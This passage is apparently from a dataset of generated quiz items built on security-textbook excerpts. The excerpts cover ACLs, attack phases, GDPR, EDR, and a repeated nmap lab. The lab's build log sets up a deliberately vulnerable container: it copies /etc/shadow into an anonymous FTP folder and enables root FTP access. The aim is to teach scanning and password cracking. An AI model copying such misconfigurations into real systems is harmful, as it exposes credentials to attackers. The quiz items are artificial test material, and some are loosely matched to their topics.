-l\n\ntotal 12\n\ndrwxr-x---+ 2 alice alice 4096 Oct 28 01:28 alice \u2460\n\ndrwxr-x---+ 2 bob   bob   4096 Oct 28 01:28 bob\n\ndrwxr-x---+ 2 carol carol 4096 Oct 28 01:28 carol\n\nroot@11ce9e5ee80e:/home# getfacl alice bob carol\n", "topic": "The discussion on web server access to user home directories emphasizes the challenges of managing permissions and the potential solutions offered by ACLs.", "question": "Considering the limitations of traditional UNIX file permissions and the need for granular access control, particularly in scenarios involving web servers accessing user home directories, explain why using ACLs (Access Control Lists) is a more appropriate solution compared to simply modifying user and group ownership.", "answer": "ACLs provide the necessary granularity to control access to user home directories for specific users (like a web server) without impacting the permissions of other users or the system.", "explanation": "The context highlights that traditional permissions offer insufficient granularity, allowing anyone to view the contents of a directory even if only the owner has read access. ACLs, conversely, provide a mechanism to explicitly define permissions for specific users or groups, circumventing the broader \"others\" permissions and enabling more precise control, as demonstrated by granting read and execute permissions to the \u2018http\u2019 user without affecting other users.", "question_token_count": 52, "answer_correctness_score": 9, "explanation_validity_score": 9, "question_clarity_score": 8, "question_groundedness_score": 10, "avg_answer_token_count": 34, "choices": null}
{"context": "### 9.5.2. Resource Development {#_computer_systems_security_planning_for_success.xhtml__resource_development}\nResource development involves acquiring infrastructure from which to deploy an attack. This may involve impersonation or\n\ncustom tailoring exploits based on the results of the previous reconnaissance. In the resource development phase, all\n\nthe actions needed to set the stage for an attack are performed.\n\n:::\n\n::: {.section .sect3 title=\"9.5.3. Initial Access\"}\n\n\n### 9.5.3. Initial Access {#_computer_systems_security_planning_for_success.xhtml__initial_access}\nInitial access refers to the first breach of security. There are many ways for this to occur, but some common ones are\n\nphishing, someone clicks on a link in an email, or through a compromised accounts. Attackers may find it easier to\n\nexploit the underlying software a corporation uses as is the case in a supply chain attack. There are even instances of\n\nattackers leaving rogue flash drives in common areas or attacking WiFi networks from nearby cars.\n\nHowever it is performed, initial access is the first real compromise in an attack.\n\n:::\n\n::: {.section .sect3 title=\"9.5.4. Execution\"}\n", "topic": "Detail the diverse approaches attackers may utilize to gain initial access, referencing specific examples provided in the text.", "question": "Beyond phishing and compromised accounts, what specific, less conventional methods of initial access are described in the text, and how do these differ in their potential impact?", "answer": "Supply chain attacks, rogue flash drives, and WiFi network attacks.", "explanation": "The text details methods like supply chain attacks, rogue flash drives, and attacks on WiFi networks. These represent a departure from typical phishing and account compromise vectors, often leveraging broader system vulnerabilities or physical access.", "question_token_count": 32, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 8, "question_groundedness_score": 10, "avg_answer_token_count": 15, "choices": null}
{"context": "## 4.5. Lab: Scanning with nmap {#_computer_systems_security_planning_for_success.xhtml__lab_scanning_with_nmap}\nFor this lab we will start by downloading and extracting the files required. Download\n\n[nmap.zip](https://github.com/rxt1077/it230/raw/main/labs/nmap.zip){.link} and extract it to a directory you can access\n\nfrom the shell. Open a shell in that directory (it should have a `docker-compose.yml`{.literal} in it and a\n\n`victim`{.literal} and `scanner`{.literal} directory). Since we will be simulating multiple machines in this lab, we\n\nwill make use of Docker Compose which was already installed with Docker. Docker Compose reads a\n\n`docker-compose.yml`{.literal} file which should already be in your `nmap`{.literal} directory. Run\n\n`docker-compose up --build --detach`{.literal} to build and run the images in the background:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>PS C:\\Users\\rxt1077\\temp\\nmap&gt; docker-compose up --build --detach\n\nBuilding victim\n\n[+] Building 2.9s (15/15) FINISHED\n\n =&gt; [internal] load build definition from Dockerfile                                                                                                   0.1s\n\n =&gt; =&gt; transferring dockerfile: 518B                                                                                                                   0.0s\n\n =&gt; [internal] load .dockerignore                                                                                                                      0.1s\n\n =&gt; =&gt; transferring context: 2B                                                                                                                        0.0s\n\n =&gt; [internal] load metadata for docker.io/library/debian:latest                                                                                       0.0s\n\n =&gt; [ 1/10] FROM docker.io/library/debian                                                                                                              0.0s\n\n =&gt; [internal] load build context                                                                                                                      0.0s\n\n =&gt; =&gt; transferring context: 640B                                                                                                                      0.0s\n\n =&gt; CACHED [ 2/10] RUN apt-get -y update                                                                                                               0.0s\n\n =&gt; CACHED [ 3/10] RUN apt-get -y install proftpd-basic                                                                                                0.0s\n\n =&gt; CACHED [ 4/10] RUN sed -i &quot;1s/.*/root:$6$.DEC7ti\\/4959zEK9$H7BPwBTz6tISYG8oZuhXLS5L3ZPYwdzzQNQTg8m4Ql3ebX9U\\/afVhi4OSpK3mNTSpT8DefJ2USdWuT5DHOkRY  0.0s\n\n =&gt; [ 5/10] RUN sed -i &quot;/^root/d&quot; /etc/ftpusers                                                                                                        0.4s\n\n =&gt; [ 6/10] COPY bad.conf /etc/proftpd/conf.d/                                                                                                         0.0s\n\n =&gt; [ 7/10] RUN chsh -s /bin/bash ftp                                                                                                                  0.6s\n\n =&gt; [ 8/10] RUN mkdir -p /home/ftp/incoming                                                                                                            0.5s\n\n =&gt; [ 9/10] RUN cp /etc/shadow /home/ftp/incoming/shadow.backup                                                                                        0.6s\n\n =&gt; [10/10] RUN chown -R ftp.users /home/ftp                                                                                                           0.5s\n\n =&gt; exporting to image                                                                                                                                 0.2s\n\n =&gt; =&gt; exporting layers                                                                                                                                0.2s\n\n =&gt; =&gt; writing image sha256:dc9af53b250b4f7fcfbe5a6668a540bd02ebef0353c5927ed4591a512363e831                                                           0.0s\n\n =&gt; =&gt; naming to docker.io/library/nmap_victim                                                                                                         0.0s\n\nUse &#39;docker scan&#39; to run Snyk tests against images to find vulnerabilities and learn how to fix them\n\nBuilding scanner\n\n[+] Building 0.1s (7/7) FINISHED\n\n =&gt; [internal] load build definition from Dockerfile                                                                                                   0.0s\n\n =&gt; =&gt; transferring dockerfile: 111B                                                                                                                   0.0s\n\n =&gt; [internal] load .dockerignore                                                                                                                      0.0s\n\n =&gt; =&gt; transferring context: 2B                                                                                                                        0.0s\n\n =&gt; [internal] load metadata for docker.io/library/debian:latest                                                                                       0.0s\n\n =&gt; [1/3] FROM docker.io/library/debian                                                                                                                0.0s\n\n =&gt; CACHED [2/3] RUN apt-get -y update                                                                                                                 0.0s\n\n =&gt; CACHED [3/3] RUN apt-get -y install nmap ftp john                                                                                                  0.0s\n\n =&gt; exporting to image                                                                                                                                 0.0s\n\n =&gt; =&gt; exporting layers                                                                                                                                0.0s\n\n =&gt; =&gt; writing image sha256:14ba503b7925089023184d783c53c22c4167fdf2338df0e85143daedf8b458ac                                                           0.0s\n\n =&gt; =&gt; naming to docker.io/library/nmap_scanner                                                                                                        0.0s\n\nUse &#39;docker scan&#39; to run Snyk tests against images to find vulnerabilities and learn how to fix them\n\nStarting nmap_scanner_1  ... done\n\nRecreating nmap_victim_1 ... done</code></pre>\n\n</figure>\n\nNow we actually have two containers running, one named `victim`{.literal} which is our target machine and another named\n\n`scanner`{.literal} which we will use to learn about nmap. Lets start a BASH shell on `scanner`{.literal} and work from\n\nthere:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>PS C:\\Users\\rxt1077\\temp\\nmap&gt; docker-compose run scanner bash\n\nCreating nmap_scanner_run ... done\n\nroot@7b6d733cc03a:/\u2460</code></pre>\n\n</figure>\n\n::: callout-list\n\n1.  *\u2460* Notice the prompt change. We are now *inside* the `scanner`{.literal} container running BASH.\n\n:::\n\nLets use the Linux `ip addr`{.literal} command to see what our IP address on this network is:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# ip addr\n\n1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n\n    inet 127.0.0.1/8 scope host lo\n\n       valid_lft forever preferred_lft forever\n\n2: tunl0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000\n\n    link/ipip 0.0.0.0 brd 0.0.0.0\n\n3: sit0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000\n\n    link/sit 0.0.0.0 brd 0.0.0.0\n\n165: eth0@if166: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default\n\n    link/ether 02:42:ac:14:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0\n\n    inet 172.20.0.2/16 brd 172.20.255.255 scope global eth0\n\n       valid_lft forever preferred_lft forever</code></pre>\n\n</figure>\n\nWe care about the `eth0`{.literal} device, so as you can see on my machine the address is `172.20.0.2`{.literal}. We\n\nwill use nmap's ping scan to search for any device within the last 8 bits of our IP address (`/24`{.literal}). You may\n\nnotice that we are actually on a `/16`{.literal} subnet, but by limiting ourselves to `/24`{.literal} the scan will go\n\n*much* faster.\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap -sP 172.20.0.0/24\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:25 UTC\n\nNmap scan report for 172.20.0.1\n\nHost is up (0.000076s latency).\n\nMAC Address: 02:42:A6:CA:0D:77 (Unknown)\n\nNmap scan report for nmap_victim_1.nmap_default (172.20.0.3)\n\nHost is up (0.000070s latency).\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNmap scan report for 7b6d733cc03a (172.20.0.2)\n\nHost is up.\n\nNmap done: 256 IP addresses (3 hosts up) scanned in 5.78 seconds</code></pre>\n\n</figure>\n\nIn this instance we found three other machines on the network. One of which is conveniently named victim.\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\n[Read the nmap documentation for host discovery.](https://nmap.org/book/man-host-discovery.html){.link} What other types\n\nof scans could you use if a host does not respond to an ICMP ping packet?\n\n:::\n\n</aside>\n\nNow lets do a full scan on on the victim machine. Docker Compose does a nice job of resolving DNS requests for sensible\n\nnames in the `docker-compose.yml`{.literal} file so we can refer to the host we want to scan as `victim`{.literal}.\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap victim\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:37 UTC\n\nNmap scan report for victim (172.20.0.3)\n\nHost is up (0.000018s latency).\n\nrDNS record for 172.20.0.3: nmap_victim_1.nmap_default\n\nNot shown: 999 closed ports\n\nPORT   STATE SERVICE\n\n21/tcp open  ftp\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 1.84 seconds</code></pre>\n\n</figure>\n\nBy default, nmap uses a [SYN](https://www.techtarget.com/searchnetworking/definition/SYN-scanning){.link} scan against\n\nwell known ports. This type of scan is harder to detect (as it does not fully open a connection) and can be run quickly.\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nWhat ports are open on the victim machine? Why is *this* particular protocol insecure?\n\n:::\n\n</aside>\n\nnmap is capable of much more than just simple port scanning. nmap includes version detection and OS fingerprinting\n\n(among other things). To get a much better picture of what exactly `victim`{.literal} is running, you can use the\n\n`-A`{.literal} option:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap -A victim\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:44 UTC\n\nNmap scan report for victim (172.20.0.3)\n\nHost is up (0.000096s latency).\n\nrDNS record for 172.20.0.3: nmap_victim_1.nmap_default\n\nNot shown: 999 closed ports\n\nPORT   STATE SERVICE VERSION\n\n21/tcp open  ftp     ProFTPD\n\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n\n|_drwxr-xr-x   1 ftp      users        4096 Sep 22 20:11 incoming\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\n\nTCP/IP fingerprint:\n\nOS:SCAN(V=7.70%E=4%D=9/22%OT=21%CT=1%CU=44136%PV=Y%DS=1%DC=D%G=Y%M=0242AC%T\n\nOS:M=614B95AE%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%TS=A\n\nOS:)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B\n\nOS:4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88\n\nOS:)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+\n\nOS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)\n\nOS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A\n\nOS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D\n\nOS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4\n\nOS:0%CD=S)\n\nNetwork Distance: 1 hop\n\nTRACEROUTE\n\nHOP RTT     ADDRESS\n\n1   0.10 ms nmap_victim_1.nmap_default (172.20.0.3)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n\nNmap done: 1 IP address (1 host up) scanned in 28.39 seconds</code></pre>\n\n</figure>\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nWhat additional information did you learn from the `-A`{.literal} option? How do you think this could be exploited?\n\n:::\n\n</aside>\n\nNow, using the `scanner`{.literal} container you are currently on see what you can find out about `victim`{.literal}.\n\n[This man page may be of some help.](https://linux.die.net/man/1/ftp){.link}\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nBONUS: Remembering what you learned in the *Hash it Out* lab, what is the root password on the victim machine?\n\n:::\n\n</aside>\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nBONUS: How can you test to see if you got it right? What does this say about how ProFTP is configured on\n\n`victim`{.literal}?\n\n:::\n\n</aside>\n\nWhen you are all done poking around, you can exit the shell and run `docker-compose down`{.literal} to stop\n\n`victim`{.literal} from running in the background.\n\n:::::::::\n\n:::: {.section .sect2 title=\"4.6. Review Questions\"}\n", "topic": "Understanding how to troubleshoot issues related to container networking and connectivity.", "question": "Based on the provided context, what specific vulnerabilities or misconfigurations were identified on the \u2018victim\u2019 container, and how did the nmap scan reveal these issues?", "answer": "ProFTPD with anonymous FTP login allowed, weak root password, and identified operating system.", "explanation": "The nmap scan revealed that the \u2018victim\u2019 container was running ProFTPD with anonymous FTP login enabled, and had a weak root password. The scan also identified the operating system, which could be exploited to gain access.", "question_token_count": 35, "answer_correctness_score": 9, "explanation_validity_score": 9, "question_clarity_score": 8, "question_groundedness_score": 9, "avg_answer_token_count": 19, "choices": null}
{"context": "### 8.2.6. GDPR {#_computer_systems_security_planning_for_success.xhtml__gdpr}\n<figure class=\"image left\">\n\n<div class=\"content\">\n\n<img src=\"images/gdpr.jpg\" width=\"300\" alt=\"gdpr\" />\n\n</div>\n\n<figcaption><a href=\"https://www.Convert.com/GDPR\" class=\"link\">Convert GDPR</a> is used under <a\n\nhref=\"https://creativecommons.org/licenses/by/2.0/\" class=\"link\">CC BY 2.0</a></figcaption>\n\n</figure>\n\nThe General Data Protection Regulation (GDPR) is a less targeted, but more far-reaching European Union law requiring\n\nthat customers be notified if they are being tracked. For most people, the biggest effect of the GDPR is that they have\n\nto sign off on cookies being used by web sites. Recall that cookies are used almost exclusively for session management\n\nand as such they track visitors to a website.\n\nThe GDPR outlines rules for risk assessment, encryption, pseudonym usage, documentation, and audits. The GDPR also gives\n\nvisitors the option to have their customer data forgotten by a website. Businesses wishing to operation in the European\n\ntheater, most world-wide businesses, must make themselves GDPR compliant.\n\n:::\n\n::: {.section .sect3 title=\"8.2.7. US Patriot Act/PRISM\"}\n", "topic": "What are the primary ways the GDPR impacts website visitor behavior regarding data tracking?", "question": "How does the GDPR directly influence a website visitor's interaction with the site?", "answer": "Consent to cookie usage.", "explanation": "The text states that the GDPR necessitates visitors' explicit consent for tracking via cookies.", "question_token_count": 16, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 8, "question_groundedness_score": 10, "avg_answer_token_count": 6, "choices": null}
{"context": "### 9.5.10. Lateral Movement {#_computer_systems_security_planning_for_success.xhtml__lateral_movement}\nLateral movement refers to moving across internal systems without any major change in privilege. This may refer to a\n\ncompromised user account being used to compromise other user accounts. The more accounts an attacker has access to, the\n\nmore effectively they can learn about the environment. Having access to multiple accounts also gives the attacker more\n\noptions for persistence, credential access, and internal spearphishing.\n\n:::\n\n::: {.section .sect3 title=\"9.5.11. Collection\"}\n\n\n### 9.5.11. Collection {#_computer_systems_security_planning_for_success.xhtml__collection}\nData can be collected from workstation keyboards, as well as laptop cameras and microphones. Local system data, shared\n\ndrive data, and removable media data can all be harvested as well. Emails can be skimmed and stored and in some\n\ninstances screen recordings may also be employed. Much like in Discovery an attacker is often after as much data as they\n\ncan possibly collect.\n\n:::\n\n::: {.section .sect3 title=\"9.5.12. Command and Control\"}\n", "topic": "Data collection, encompassing various sources like keyboards, cameras, and removable media, is a key tactic employed by attackers to maximize their understanding of a compromised environment.", "question": "Beyond simply acquiring access to multiple accounts, how does the deliberate and extensive collection of diverse data types (keyboards, cameras, removable media, etc.) fundamentally alter an attacker\u2019s ability to formulate a successful intrusion strategy?", "answer": "It enables more targeted and sophisticated attacks.", "explanation": "The text explicitly states that access to multiple accounts \u201cgives the attacker more options for persistence, credential access, and internal spearphishing.\u201d The broad data collection described further amplifies this by providing a comprehensive view of the environment, enabling more targeted and sophisticated attacks.", "question_token_count": 44, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 7, "question_groundedness_score": 9, "avg_answer_token_count": 9, "choices": null}
{"context": "### 6.3.5. TAP {#_computer_systems_security_planning_for_success.xhtml__tap}\nSometimes it is necessary for a network or security engineer to monitor what is happening on a particular network\n\nsegment. In this case a network terminal access point (TAP) can be employed. A TAP creates a copy of network traffic and\n\nforwards it to a particular port on a switch or router.\n\n:::\n\n::::::::\n\n::: {.section .sect2 title=\"6.4. EDR\"}\n\n\n## 6.4. EDR {#_computer_systems_security_planning_for_success.xhtml__edr}\nEndpoint Detection and Response (EDR) is used to secure endpoints: servers, workstations, desktops, mobile devices, etc.\n\nEDR is typically implemented as a host-based incident prevention system (HBIPS), software that runs on the endpoint to\n\nmonitor and collect data.\n\nThese systems will usually watch for indicators of compromise, scan for malware, and can even quarantine or shutdown the\n\nendpoint as needed. Company hardware is a significant investment for any business and an EDR makes sure that investment\n\nis protected. Many systems exist for EDR including FireEye, SEP, and CrowdStrike.\n\n:::\n\n::: {.section .sect2 title=\"6.5. Data Loss Prevention\"}\n", "topic": "Considering the functionalities of TAPs, EDR, and DLP, how might these technologies be strategically combined to create a layered security approach?", "question": "How might the real-time traffic analysis provided by a TAP be leveraged in conjunction with an EDR system to proactively identify and mitigate advanced persistent threats?", "answer": "Correlate TAP traffic analysis with EDR alerts.", "explanation": "TAP provides a continuous stream of network data, which can be analyzed to detect anomalous behavior or traffic patterns indicative of an attack. EDR, by monitoring endpoints, can then investigate these alerts and take appropriate action.", "question_token_count": 31, "answer_correctness_score": 9, "explanation_validity_score": 9, "question_clarity_score": 7, "question_groundedness_score": 6, "avg_answer_token_count": 12, "choices": null}
{"context": "## 4.5. Lab: Scanning with nmap {#_computer_systems_security_planning_for_success.xhtml__lab_scanning_with_nmap}\nFor this lab we will start by downloading and extracting the files required. Download\n\n[nmap.zip](https://github.com/rxt1077/it230/raw/main/labs/nmap.zip){.link} and extract it to a directory you can access\n\nfrom the shell. Open a shell in that directory (it should have a `docker-compose.yml`{.literal} in it and a\n\n`victim`{.literal} and `scanner`{.literal} directory). Since we will be simulating multiple machines in this lab, we\n\nwill make use of Docker Compose which was already installed with Docker. Docker Compose reads a\n\n`docker-compose.yml`{.literal} file which should already be in your `nmap`{.literal} directory. Run\n\n`docker-compose up --build --detach`{.literal} to build and run the images in the background:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>PS C:\\Users\\rxt1077\\temp\\nmap&gt; docker-compose up --build --detach\n\nBuilding victim\n\n[+] Building 2.9s (15/15) FINISHED\n\n =&gt; [internal] load build definition from Dockerfile                                                                                                   0.1s\n\n =&gt; =&gt; transferring dockerfile: 518B                                                                                                                   0.0s\n\n =&gt; [internal] load .dockerignore                                                                                                                      0.1s\n\n =&gt; =&gt; transferring context: 2B                                                                                                                        0.0s\n\n =&gt; [internal] load metadata for docker.io/library/debian:latest                                                                                       0.0s\n\n =&gt; [ 1/10] FROM docker.io/library/debian                                                                                                              0.0s\n\n =&gt; [internal] load build context                                                                                                                      0.0s\n\n =&gt; =&gt; transferring context: 640B                                                                                                                      0.0s\n\n =&gt; CACHED [ 2/10] RUN apt-get -y update                                                                                                               0.0s\n\n =&gt; CACHED [ 3/10] RUN apt-get -y install proftpd-basic                                                                                                0.0s\n\n =&gt; CACHED [ 4/10] RUN sed -i &quot;1s/.*/root:$6$.DEC7ti\\/4959zEK9$H7BPwBTz6tISYG8oZuhXLS5L3ZPYwdzzQNQTg8m4Ql3ebX9U\\/afVhi4OSpK3mNTSpT8DefJ2USdWuT5DHOkRY  0.0s\n\n =&gt; [ 5/10] RUN sed -i &quot;/^root/d&quot; /etc/ftpusers                                                                                                        0.4s\n\n =&gt; [ 6/10] COPY bad.conf /etc/proftpd/conf.d/                                                                                                         0.0s\n\n =&gt; [ 7/10] RUN chsh -s /bin/bash ftp                                                                                                                  0.6s\n\n =&gt; [ 8/10] RUN mkdir -p /home/ftp/incoming                                                                                                            0.5s\n\n =&gt; [ 9/10] RUN cp /etc/shadow /home/ftp/incoming/shadow.backup                                                                                        0.6s\n\n =&gt; [10/10] RUN chown -R ftp.users /home/ftp                                                                                                           0.5s\n\n =&gt; exporting to image                                                                                                                                 0.2s\n\n =&gt; =&gt; exporting layers                                                                                                                                0.2s\n\n =&gt; =&gt; writing image sha256:dc9af53b250b4f7fcfbe5a6668a540bd02ebef0353c5927ed4591a512363e831                                                           0.0s\n\n =&gt; =&gt; naming to docker.io/library/nmap_victim                                                                                                         0.0s\n\nUse &#39;docker scan&#39; to run Snyk tests against images to find vulnerabilities and learn how to fix them\n\nBuilding scanner\n\n[+] Building 0.1s (7/7) FINISHED\n\n =&gt; [internal] load build definition from Dockerfile                                                                                                   0.0s\n\n =&gt; =&gt; transferring dockerfile: 111B                                                                                                                   0.0s\n\n =&gt; [internal] load .dockerignore                                                                                                                      0.0s\n\n =&gt; =&gt; transferring context: 2B                                                                                                                        0.0s\n\n =&gt; [internal] load metadata for docker.io/library/debian:latest                                                                                       0.0s\n\n =&gt; [1/3] FROM docker.io/library/debian                                                                                                                0.0s\n\n =&gt; CACHED [2/3] RUN apt-get -y update                                                                                                                 0.0s\n\n =&gt; CACHED [3/3] RUN apt-get -y install nmap ftp john                                                                                                  0.0s\n\n =&gt; exporting to image                                                                                                                                 0.0s\n\n =&gt; =&gt; exporting layers                                                                                                                                0.0s\n\n =&gt; =&gt; writing image sha256:14ba503b7925089023184d783c53c22c4167fdf2338df0e85143daedf8b458ac                                                           0.0s\n\n =&gt; =&gt; naming to docker.io/library/nmap_scanner                                                                                                        0.0s\n\nUse &#39;docker scan&#39; to run Snyk tests against images to find vulnerabilities and learn how to fix them\n\nStarting nmap_scanner_1  ... done\n\nRecreating nmap_victim_1 ... done</code></pre>\n\n</figure>\n\nNow we actually have two containers running, one named `victim`{.literal} which is our target machine and another named\n\n`scanner`{.literal} which we will use to learn about nmap. Lets start a BASH shell on `scanner`{.literal} and work from\n\nthere:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>PS C:\\Users\\rxt1077\\temp\\nmap&gt; docker-compose run scanner bash\n\nCreating nmap_scanner_run ... done\n\nroot@7b6d733cc03a:/\u2460</code></pre>\n\n</figure>\n\n::: callout-list\n\n1.  *\u2460* Notice the prompt change. We are now *inside* the `scanner`{.literal} container running BASH.\n\n:::\n\nLets use the Linux `ip addr`{.literal} command to see what our IP address on this network is:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# ip addr\n\n1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n\n    inet 127.0.0.1/8 scope host lo\n\n       valid_lft forever preferred_lft forever\n\n2: tunl0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000\n\n    link/ipip 0.0.0.0 brd 0.0.0.0\n\n3: sit0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000\n\n    link/sit 0.0.0.0 brd 0.0.0.0\n\n165: eth0@if166: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default\n\n    link/ether 02:42:ac:14:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0\n\n    inet 172.20.0.2/16 brd 172.20.255.255 scope global eth0\n\n       valid_lft forever preferred_lft forever</code></pre>\n\n</figure>\n\nWe care about the `eth0`{.literal} device, so as you can see on my machine the address is `172.20.0.2`{.literal}. We\n\nwill use nmap's ping scan to search for any device within the last 8 bits of our IP address (`/24`{.literal}). You may\n\nnotice that we are actually on a `/16`{.literal} subnet, but by limiting ourselves to `/24`{.literal} the scan will go\n\n*much* faster.\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap -sP 172.20.0.0/24\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:25 UTC\n\nNmap scan report for 172.20.0.1\n\nHost is up (0.000076s latency).\n\nMAC Address: 02:42:A6:CA:0D:77 (Unknown)\n\nNmap scan report for nmap_victim_1.nmap_default (172.20.0.3)\n\nHost is up (0.000070s latency).\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNmap scan report for 7b6d733cc03a (172.20.0.2)\n\nHost is up.\n\nNmap done: 256 IP addresses (3 hosts up) scanned in 5.78 seconds</code></pre>\n\n</figure>\n\nIn this instance we found three other machines on the network. One of which is conveniently named victim.\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\n[Read the nmap documentation for host discovery.](https://nmap.org/book/man-host-discovery.html){.link} What other types\n\nof scans could you use if a host does not respond to an ICMP ping packet?\n\n:::\n\n</aside>\n\nNow lets do a full scan on on the victim machine. Docker Compose does a nice job of resolving DNS requests for sensible\n\nnames in the `docker-compose.yml`{.literal} file so we can refer to the host we want to scan as `victim`{.literal}.\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap victim\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:37 UTC\n\nNmap scan report for victim (172.20.0.3)\n\nHost is up (0.000018s latency).\n\nrDNS record for 172.20.0.3: nmap_victim_1.nmap_default\n\nNot shown: 999 closed ports\n\nPORT   STATE SERVICE\n\n21/tcp open  ftp\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 1.84 seconds</code></pre>\n\n</figure>\n\nBy default, nmap uses a [SYN](https://www.techtarget.com/searchnetworking/definition/SYN-scanning){.link} scan against\n\nwell known ports. This type of scan is harder to detect (as it does not fully open a connection) and can be run quickly.\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nWhat ports are open on the victim machine? Why is *this* particular protocol insecure?\n\n:::\n\n</aside>\n\nnmap is capable of much more than just simple port scanning. nmap includes version detection and OS fingerprinting\n\n(among other things). To get a much better picture of what exactly `victim`{.literal} is running, you can use the\n\n`-A`{.literal} option:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap -A victim\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:44 UTC\n\nNmap scan report for victim (172.20.0.3)\n\nHost is up (0.000096s latency).\n\nrDNS record for 172.20.0.3: nmap_victim_1.nmap_default\n\nNot shown: 999 closed ports\n\nPORT   STATE SERVICE VERSION\n\n21/tcp open  ftp     ProFTPD\n\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n\n|_drwxr-xr-x   1 ftp      users        4096 Sep 22 20:11 incoming\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\n\nTCP/IP 